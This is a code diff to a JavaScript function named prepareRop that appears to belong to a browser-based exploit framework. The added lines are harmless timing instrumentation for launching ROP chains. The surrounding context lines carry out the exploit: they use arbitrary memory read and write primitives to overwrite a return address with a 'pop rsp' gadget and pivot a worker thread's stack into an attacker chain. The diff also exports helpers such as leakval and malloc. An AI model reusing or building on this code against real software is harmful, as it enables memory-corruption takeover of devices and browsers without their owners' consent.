@@ -262,8 +262,45 @@ async function prepareRop(p) {
     worker.postMessage(0);
   }
 
+  // Opt-in, scoped counters. Normal calls never read the profiling clock.
+  let workerTiming = null;
+  async function measureWorkerCalls(fn) {
+    if (workerTiming) throw new Error("worker timing is already active");
+    if (typeof fn !== "function") throw new Error("worker timing needs a callback");
+    if (typeof performance === "undefined" || typeof performance.now !== "function")
+      throw new Error("worker timing requires performance.now");
+    const timing = {calls: 0, completed: 0, parkFailures: 0, timeouts: 0,
+      parkMs: 0, setupMs: 0, completionMs: 0, clockErrors: 0};
+    workerTiming = timing;
+    try {
+      const result = await fn();
+      return {result, timing: Object.assign({}, timing)};
+    } finally {
+      workerTiming = null;
+    }
+  }
+  function addWorkerTiming(timing, field, start) {
+    const end = performance.now();
+    const elapsed = end - start;
+    if (!Number.isFinite(elapsed) || elapsed < 0) timing.clockErrors++;
+    else timing[field] += elapsed;
+    return end;
+  }
+
   async function launchChain(chain) {
-    await waitForPark("chain launch");
+    const timing = workerTiming;
+    let phaseStart = timing ? performance.now() : 0;
+    if (timing) timing.calls++;
+    try {
+      await waitForPark("chain launch");
+    } catch (error) {
+      if (timing) {
+        addWorkerTiming(timing, "parkMs", phaseStart);
+        timing.parkFailures++;
+      }
+      throw error;
+    }
+    if (timing) phaseStart = addWorkerTiming(timing, "parkMs", phaseStart);
     const originalStackPointer = p.read8(stackPointerSlot);
     chain.push_write8(originalContext, originalReturnAddress);
     chain.push_write8(originalContext.add32(0x10), returnAddress);
@@ -275,6 +312,7 @@ async function prepareRop(p) {
     p.write8(returnAddress, gadgets["pop rsp"]);
     p.write8(stackPointerSlot, chain.stack_entry_point);
 
+    if (timing) phaseStart = addWorkerTiming(timing, "setupMs", phaseStart);
     const completed = await new Promise((resolve) => {
       let settled = false;
       let timer;
@@ -288,6 +326,12 @@ async function prepareRop(p) {
       timer = setTimeout(() => finish(false), ROP_WAIT_MS);
       worker.postMessage(0);
     });
+
+    if (timing) {
+      addWorkerTiming(timing, "completionMs", phaseStart);
+      if (completed) timing.completed++;
+      else timing.timeouts++;
+    }
 
     if (!completed) {
       // Even if the chain is still in flight, restoring the slot is the
@@ -315,6 +359,7 @@ async function prepareRop(p) {
     leakval: p.leakval,
     pre_chain: prepareChain,
     launch_chain: launchChain,
+    measureWorkerCalls,
     launch_chain_detached: launchChainDetached,
     malloc,
     stringify,
